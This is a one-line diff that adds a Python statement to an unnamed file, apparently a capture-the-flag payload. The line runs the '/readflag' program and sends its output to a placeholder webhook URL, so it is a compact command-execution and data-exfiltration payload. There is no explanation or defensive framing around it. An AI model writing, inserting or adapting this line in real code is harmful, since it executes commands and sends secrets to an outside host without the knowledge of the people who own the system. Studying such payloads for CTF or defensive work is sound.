@@ -1,0 +1,1 @@
+import subprocess; import urllib.request; urllib.request.urlopen("WEBHOOK_URL", data=subprocess.run(["/readflag"], capture_output=True).stdout)
